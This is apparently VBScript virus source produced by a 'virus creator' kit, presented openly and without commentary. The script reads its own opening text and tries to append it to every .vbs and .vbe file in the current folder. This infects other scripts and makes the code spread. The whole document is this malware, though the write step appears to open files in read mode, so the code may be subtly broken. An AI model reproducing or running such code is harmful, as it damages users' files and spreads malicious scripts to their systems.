'12345
'Created by dex with SIMPLE VBSCRIPT VIRUS CREATOR v1.0
Set FSO = CreateObject("Scripting.FileSystemObject")
Set OpenSelf = FSO.OpenTextFile(Wscript.ScriptFullName, 1, True)
Self = OpenSelf.Read(507)
Set CurrentDirectory = FSO.GetFolder(".").Files
For Each ScriptFiles in CurrentDirectory
ExtName = Lcase(FSO.GetExtensionName(ScriptFiles.path))
If ExtName = "vbs" or ExtName = "vbe" then
Set Scripts = FSO.OpenTextFile(ScriptFiles.path)
Scripts.WriteLine Self
Scripts.Close
End If
Next
